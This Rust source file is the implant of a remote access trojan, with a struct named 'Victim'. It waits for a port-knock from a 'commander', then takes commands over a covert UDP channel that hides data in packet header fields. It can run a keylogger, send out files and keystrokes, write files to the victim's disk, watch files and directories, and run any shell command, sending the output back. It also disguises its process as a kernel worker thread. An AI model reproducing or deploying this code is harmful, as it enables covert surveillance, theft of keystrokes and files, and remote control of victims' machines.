use std::net::{IpAddr, Ipv4Addr};
use std::sync::mpsc::{self, Receiver, Sender};
use std::thread;
use std::time::Duration;
use std::process::Command;
use std::fs;
use std::collections::HashMap;
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use pnet::packet::Packet;
use pnet::transport::{transport_channel, TransportChannelType::Layer3, TransportSender};
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::datalink::{self, NetworkInterface};
use libc::{prctl, PR_SET_NAME};
use std::ffi::CString;

mod covert;
mod keylogger;
mod port_knkr;

use keylogger::Control as KeylogControl;
use port_knkr::{SimpleRng, generate_seed};

const CMD_START_LOGGER:   u8 = 0x10;
const CMD_STOP_LOGGER:    u8 = 0x20;
const CMD_UNINSTALL:      u8 = 0x30;
const CMD_REQUEST_KEYLOG: u8 = 0x50;
const CMD_UPLOAD_FILE:    u8 = 0x60;
const CMD_DOWNLOAD_FILE:  u8 = 0x70;
const CMD_WATCH_FILE:     u8 = 0x80;
const CMD_WATCH_DIR:      u8 = 0x90;
const CMD_STOP_WATCH:     u8 = 0x91;

const CHUNK_SIZE: usize = 28;

struct Victim {
    local_ip: Ipv4Addr,
    interface: NetworkInterface,
    keylog_control_tx: Option<Sender<KeylogControl>>,
    keylog_data_rx:    Option<Receiver<String>>,
    file_watchers: HashMap<String, Arc<AtomicBool>>,
    upload_buffer: Vec<u8>,
    upload_metadata: Option<UploadMetadata>,
}

struct UploadMetadata {
    remote_path: String,
    total_size: Option<usize>,
}

impl Victim {
    fn new() -> Self {
        let (interface, local_ip) = Self::find_active_interface().expect("No active interface");
        Self {
            local_ip,
            interface,
            keylog_control_tx: None,
            keylog_data_rx: None,
            file_watchers: HashMap::new(),
            upload_buffer: Vec::new(),
            upload_metadata: None,
        }
    }

    fn find_active_interface() -> Option<(NetworkInterface, Ipv4Addr)> {
        datalink::interfaces().into_iter().find(|iface| {
            iface.is_up() && !iface.ips.is_empty()
        }).and_then(|iface| {
            iface.ips.iter().find_map(|ip| {
                if let IpAddr::V4(v4) = ip.ip() { Some((iface.clone(), v4)) } else { None }
            })
        })
    }

    fn wait_for_commander(&self) -> (Ipv4Addr, u16, u16) {
        let protocol = Layer3(IpNextHeaderProtocols::Ipv4);
        let (_, mut rx) = transport_channel(4096, protocol).unwrap();
        let mut rx_iter = pnet::transport::ipv4_packet_iter(&mut rx);

        loop {
            let seed = generate_seed(&self.local_ip, 0);
            let mut rng = SimpleRng::new(seed);
            let knocks = [rng.gen_port(), rng.gen_port(), rng.gen_port()];
            let tx_p = rng.gen_port();
            let rx_p = rng.gen_port();

            if let Ok((packet, _)) = rx_iter.next() {
                let source_ip = packet.get_source();
                // Port knock uses TCP SYN, covert channel uses UDP
                if let Some(tcp) = pnet::packet::tcp::TcpPacket::new(packet.payload()) {
                    if tcp.get_destination() == knocks[0] {
                        let mut knock_count = 1;
                        let start = std::time::Instant::now();
                        
                        while start.elapsed() < Duration::from_secs(5) && knock_count < 3 {
                             if let Ok((p, _)) = rx_iter.next() {
                                 if let Some(t) = pnet::packet::tcp::TcpPacket::new(p.payload()) {
                                     if t.get_destination() == knocks[knock_count] {
                                         knock_count += 1;
                                     }
                                 }
                             }
                        }

                        if knock_count == 3 {
                            return (source_ip, tx_p, rx_p);
                        }
                    }
                }
            }
        }
    }

    pub fn run(&mut self) {
        let (commander_ip, my_port, cmd_port) = self.wait_for_commander();
        let protocol = Layer3(IpNextHeaderProtocols::Ipv4);
        let (tx, rx) = transport_channel(65535, protocol).unwrap();
        self.main_loop(tx, rx, commander_ip, my_port, cmd_port);
    }

    fn main_loop(&mut self, mut tx: TransportSender, mut rx: pnet::transport::TransportReceiver, commander_ip: Ipv4Addr, my_port: u16, cmd_port: u16) {
        let mut receiver_state = covert::ReceiverState::new();
        let mut rx_iter = pnet::transport::ipv4_packet_iter(&mut rx);
        let local_ip = self.local_ip;

        loop {
            if let Some(ref rx_chan) = self.keylog_data_rx {
                while let Ok(line) = rx_chan.try_recv() {
                    let _ = send_covert_msg(&line, local_ip, commander_ip, my_port, cmd_port);
                }
            }

            if let Ok((packet, _)) = rx_iter.next() {
                if packet.get_source() != IpAddr::V4(commander_ip) { 
                    continue; 
                }

                // UDP: parse UDP request packet instead of TCP SYN
                if let Some(parsed) = covert::parse_udp_request_from_ipv4_packet(packet.packet()) {
                    if parsed.dst_port == my_port {
                        // UDP: covert data in source port field (cast to u32 for unmasking)
                        let unmasked = covert::unmask_word(parsed.src_port as u32, parsed.ip_id);
                        
                        if let Ok((_action, sig_id)) = receiver_state.apply_chunk(parsed.ip_id, unmasked) {
                            // UDP: build response packet with signature in destination port
                            let ack_pkt = covert::build_udp_response_packet(
                                local_ip,
                                commander_ip,
                                my_port,
                                sig_id,  // signature goes in UDP destination port
                            );
                            if let Some(ip_view) = pnet::packet::ipv4::Ipv4Packet::new(&ack_pkt) {
                                let _ = tx.send_to(ip_view, IpAddr::V4(commander_ip));
                            }

                            if receiver_state.complete {
                                let chunk = receiver_state.buffer.clone();
                                
                                if self.upload_metadata.is_some() {
                                    if chunk.len() == 1 && chunk[0] == 0xFF {
                                        if let Some(meta) = self.upload_metadata.take() {
                                            let _ = fs::write(&meta.remote_path, &self.upload_buffer);
                                        }
                                        self.upload_buffer.clear();
                                    } else {
                                        self.upload_buffer.extend_from_slice(&chunk);
                                    }
                                } else {
                                    if !chunk.is_empty() {
                                        self.handle_command(&chunk, &mut tx, commander_ip, my_port, cmd_port, local_ip);
                                    }
                                }
                                
                                receiver_state = covert::ReceiverState::new();
                            }
                        }
                    }
                }
            }
        }
    }

    fn handle_command(&mut self, cmd: &[u8], _tx: &mut TransportSender, cmd_ip: Ipv4Addr, my_port: u16, cmd_port: u16, local_ip: Ipv4Addr) {
        if cmd.is_empty() { return; }
        
        match cmd[0] {
            CMD_START_LOGGER => self.start_keylogger(),
            CMD_STOP_LOGGER => self.stop_keylogger(),
            CMD_REQUEST_KEYLOG => {
                let _ = self.send_keylog_file(_tx, cmd_ip, my_port, cmd_port, local_ip);
            }
            CMD_UNINSTALL => std::process::exit(0),
            CMD_UPLOAD_FILE => {
                if cmd.len() >= 2 {
                    let path_len = cmd[1] as usize;
                    if cmd.len() >= 2 + path_len {
                        let remote_path = String::from_utf8_lossy(&cmd[2..2+path_len]).to_string();
                        self.upload_metadata = Some(UploadMetadata {
                            remote_path,
                            total_size: None,
                        });
                    }
                }
            }
            CMD_DOWNLOAD_FILE => {
                if cmd.len() >= 2 {
                    let path_len = cmd[1] as usize;
                    if cmd.len() >= 2 + path_len {
                        let file_path = String::from_utf8_lossy(&cmd[2..2+path_len]).to_string();
                        let _ = self.send_file_to_commander(&file_path, _tx, cmd_ip, my_port, cmd_port, local_ip);
                    }
                }
            }
            CMD_WATCH_FILE => {
                if cmd.len() >= 2 {
                    let path_len = cmd[1] as usize;
                    if cmd.len() >= 2 + path_len {
                        let file_path = String::from_utf8_lossy(&cmd[2..2+path_len]).to_string();
                        let _ = self.start_file_watch(&file_path, cmd_ip, my_port, cmd_port, local_ip);
                    }
                }
            }
            CMD_WATCH_DIR => {
                if cmd.len() >= 2 {
                    let path_len = cmd[1] as usize;
                    if cmd.len() >= 2 + path_len {
                        let dir_path = String::from_utf8_lossy(&cmd[2..2+path_len]).to_string();
                        let _ = self.start_dir_watch(&dir_path, cmd_ip, my_port, cmd_port, local_ip);
                    }
                }
            }
            CMD_STOP_WATCH => {
                self.stop_all_watches();
            }
            _ => {
                let shell_cmd = String::from_utf8_lossy(cmd);
                let _ = self.execute_shell(&shell_cmd, _tx, cmd_ip, my_port, cmd_port, local_ip);
            }
        }
    }

    fn start_keylogger(&mut self) {
        let (ctrl_tx, ctrl_rx) = mpsc::channel::<KeylogControl>();
        let (data_tx, data_rx) = mpsc::channel::<String>();
        thread::spawn(move || { let _ = keylogger::run_with_control(ctrl_rx, data_tx); });
        self.keylog_control_tx = Some(ctrl_tx);
        self.keylog_data_rx = Some(data_rx);
    }

    fn stop_keylogger(&mut self) {
        if let Some(tx) = self.keylog_control_tx.take() { 
            let _ = tx.send(KeylogControl::Stop); 
        }
        self.keylog_data_rx = None;
    }

    fn send_keylog_file(&self, tx: &mut TransportSender, dst_ip: Ipv4Addr, src_port: u16, dst_port: u16, local_ip: Ipv4Addr) -> Result<(), String> {
        if let Ok(content) = fs::read("./data/captured_keys.txt") {
            self.send_file_data(&content, tx, dst_ip, src_port, dst_port, local_ip)
        } else {
            send_covert_msg("File not found", local_ip, dst_ip, src_port, dst_port)
        }
    }

    fn send_file_to_commander(&self, file_path: &str, tx: &mut TransportSender, dst_ip: Ipv4Addr, src_port: u16, dst_port: u16, local_ip: Ipv4Addr) -> Result<(), String> {
        let content = fs::read(file_path)
            .map_err(|e| format!("Failed to read file: {}", e))?;
        self.send_file_data(&content, tx, dst_ip, src_port, dst_port, local_ip)
    }

    fn send_file_data(&self, content: &[u8], _tx: &mut TransportSender, dst_ip: Ipv4Addr, src_port: u16, dst_port: u16, local_ip: Ipv4Addr) -> Result<(), String> {
        let size_bytes = (content.len() as u32).to_be_bytes();
        send_covert_msg_bytes(&size_bytes, local_ip, dst_ip, src_port, dst_port)?;
        for chunk in content.chunks(CHUNK_SIZE) {
            send_covert_msg_bytes(chunk, local_ip, dst_ip, src_port, dst_port)?;
        }
        send_covert_msg_bytes(&[0xFF], local_ip, dst_ip, src_port, dst_port)?;
        Ok(())
    }

    fn start_file_watch(&mut self, file_path: &str, cmd_ip: Ipv4Addr, my_port: u16, cmd_port: u16, local_ip: Ipv4Addr) -> Result<(), String> {
        let path = file_path.to_string();
        let running = Arc::new(AtomicBool::new(true));
        self.file_watchers.insert(file_path.to_string(), running.clone());
        let running_clone = running.clone();
        let path_clone = path.clone();
        
        thread::spawn(move || {
            let mut last_modified = None;
            while running_clone.load(Ordering::SeqCst) {
                if let Ok(metadata) = fs::metadata(&path_clone) {
                    if let Ok(modified) = metadata.modified() {
                        if last_modified != Some(modified) {
                            if let Ok(content) = fs::read(&path_clone) {
                                let msg = format!("[FILE CHANGE] {}: {} bytes", path_clone, content.len());
                                let _ = send_covert_msg(&msg, local_ip, cmd_ip, my_port, cmd_port);
                            }
                            last_modified = Some(modified);
                        }
                    }
                }
                thread::sleep(Duration::from_secs(2));
            }
        });
        send_covert_msg(&format!("Watching file: {}", file_path), local_ip, cmd_ip, my_port, cmd_port)
    }

    fn start_dir_watch(&mut self, dir_path: &str, cmd_ip: Ipv4Addr, my_port: u16, cmd_port: u16, local_ip: Ipv4Addr) -> Result<(), String> {
        let path = dir_path.to_string();
        let running = Arc::new(AtomicBool::new(true));
        self.file_watchers.insert(dir_path.to_string(), running.clone());
        let running_clone = running.clone();
        let path_clone = path.clone();
        
        thread::spawn(move || {
            let mut last_state: HashMap<String, u64> = HashMap::new();
            while running_clone.load(Ordering::SeqCst) {
                if let Ok(entries) = fs::read_dir(&path_clone) {
                    let mut current_state: HashMap<String, u64> = HashMap::new();
                    for entry in entries.flatten() {
                        if let Ok(name) = entry.file_name().into_string() {
                            if let Ok(meta) = entry.metadata() {
                                current_state.insert(name, meta.len());
                            }
                        }
                    }
                    for (name, size) in &current_state {
                        if last_state.get(name) != Some(size) {
                            let msg = format!("[DIR CHANGE] {}/{}: {} bytes", path_clone, name, size);
                            let _ = send_covert_msg(&msg, local_ip, cmd_ip, my_port, cmd_port);
                        }
                    }
                    for name in last_state.keys() {
                        if !current_state.contains_key(name) {
                            let msg = format!("[DIR CHANGE] {}/{}: DELETED", path_clone, name);
                            let _ = send_covert_msg(&msg, local_ip, cmd_ip, my_port, cmd_port);
                        }
                    }
                    last_state = current_state;
                }
                thread::sleep(Duration::from_secs(5));
            }
        });
        send_covert_msg(&format!("Watching directory: {}", dir_path), local_ip, cmd_ip, my_port, cmd_port)
    }

    fn stop_all_watches(&mut self) {
        for (_, running) in self.file_watchers.drain() {
            running.store(false, Ordering::SeqCst);
        }
    }

    fn execute_shell(&self, cmd: &str, _tx: &mut TransportSender, dst_ip: Ipv4Addr, src_port: u16, dst_port: u16, local_ip: Ipv4Addr) -> Result<(), String> {
        if let Ok(output) = Command::new("sh").arg("-c").arg(cmd).output() {
            if !output.stdout.is_empty() {
                send_covert_msg_bytes(&output.stdout, local_ip, dst_ip, src_port, dst_port)?;
            }
            if !output.stderr.is_empty() {
                send_covert_msg_bytes(&output.stderr, local_ip, dst_ip, src_port, dst_port)?;
            }
        }
        Ok(())
    }
}

fn send_covert_msg(msg: &str, local_ip: Ipv4Addr, dst_ip: Ipv4Addr, src_port: u16, dst_port: u16) -> Result<(), String> {
    send_covert_msg_bytes(msg.as_bytes(), local_ip, dst_ip, src_port, dst_port)
}

fn send_covert_msg_bytes(data: &[u8], local_ip: Ipv4Addr, dst_ip: Ipv4Addr, src_port: u16, dst_port: u16) -> Result<(), String> {
    let mut state = covert::SenderState::new_from_bytes(data);
    let protocol = Layer3(IpNextHeaderProtocols::Ipv4);
    let (mut tx, mut rx) = transport_channel(65535, protocol).map_err(|e| e.to_string())?;
    let mut rx_iter = pnet::transport::ipv4_packet_iter(&mut rx);

    while state.has_next() {
        if let Some((ip_id, raw_word, masked_word)) = state.chunk_to_send() {
            // UDP: covert data hidden in source port (lower 16 bits of masked_word)
            let pkt = covert::build_udp_request_packet(
                local_ip,
                dst_ip,
                src_port,  // base destination port
                ip_id,     // covert carrier in IP ID field
                masked_word, // covert data in UDP source port
            );
            if let Some(ip_view) = pnet::packet::ipv4::Ipv4Packet::new(&pkt) {
                let _ = tx.send_to(ip_view, IpAddr::V4(dst_ip));
            }
            let start = std::time::Instant::now();
            while start.elapsed() < Duration::from_millis(800) {
                if let Ok((packet, _)) = rx_iter.next() {
                    if let Some(recv_sig) = covert::parse_udp_response_signature(packet.packet()) {
                        if recv_sig == covert::signature_ip_id(ip_id, raw_word) {
                            state.ack();
                            break;
                        }
                    }
                }
            }
        }
    }
    Ok(())
}

// ============================================================================
// PROCESS DISGUISE MODULE (Linux /proc-based)
// ============================================================================

fn disguise_process_name(name: &str) -> Result<(), String> {
    // Linux kernel limit: TASK_COMM_LEN = 16 bytes (15 chars + null terminator)
    if name.len() >= 16 {
        return Err(format!("Process name '{}' exceeds 15-character kernel limit", name));
    }
    let c_name = CString::new(name)
        .map_err(|e| format!("Invalid process name '{}': {}", name, e))?;
    let result = unsafe { prctl(PR_SET_NAME, c_name.as_ptr()) };
    if result == 0 { 
        Ok(()) 
    } else { 
        Err(format!("prctl(PR_SET_NAME) failed with errno {}", result)) 
    }
}

fn main() {
    // Disguise as common kernel worker thread (must be <= 15 chars)
    let disguise_name = "kworker/0:0";
    match disguise_process_name(disguise_name) {
        Ok(_) => eprintln!("[*] Process disguised as '{}'", disguise_name),
        Err(e) => eprintln!("[!] Disguise failed: {}", e),
    }
    
    let mut victim = Victim::new();
    victim.run();
}
